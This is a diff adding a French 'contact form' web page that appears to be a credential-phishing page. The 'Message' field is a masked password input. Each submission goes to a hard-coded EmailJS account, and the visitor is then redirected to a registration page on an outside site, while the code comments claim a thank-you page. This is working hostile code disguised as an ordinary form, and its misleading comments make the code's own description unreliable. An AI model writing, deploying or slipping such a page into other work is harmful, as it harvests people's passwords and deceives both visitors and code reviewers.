@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de contact</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .form-container h2 {
+            margin-bottom: 20px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #response {
+            display: none;
+            color: green;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Envoyez-moi un message</h2>
+        <form id="contact-form">
+            <label for="name">Nom</label>
+            <input type="text" id="name" name="name" required>
+            
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="message">Message</label>
+            <input type="password" id="message" name="message" required>
+            
+            <button type="submit">Envoyer</button>
+        </form>
+        <div id="response">Message envoyé avec succès !</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("l7RHGlQsUzOwD6yc1"); // Remplace "YOUR_USER_ID" par ton USER_ID fourni par EmailJS
+        })();
+        
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche la soumission du formulaire classique
+
+            // Collecte les données du formulaire
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('message').value;
+
+            // Envoi des données via EmailJS
+            emailjs.send("service_zr11u2p", "template_mkymtll", {
+                name: name,
+                email: email,
+                message: message
+            }).then(function(response) {
+                console.log("SUCCESS", response.status, response.text);
+                document.getElementById('response').style.display = 'block'; // Affiche le message de succès
+                setTimeout(function() {
+                    window.location.href = 'https://mym.fans/app/register/email'; // Redirige vers la page "merci.html" après 2 secondes
+                }, 2000);
+            }, function(error) {
+                console.log("FAILED", error);
+            });
+        });
+    </script>
+</body>
+</html>
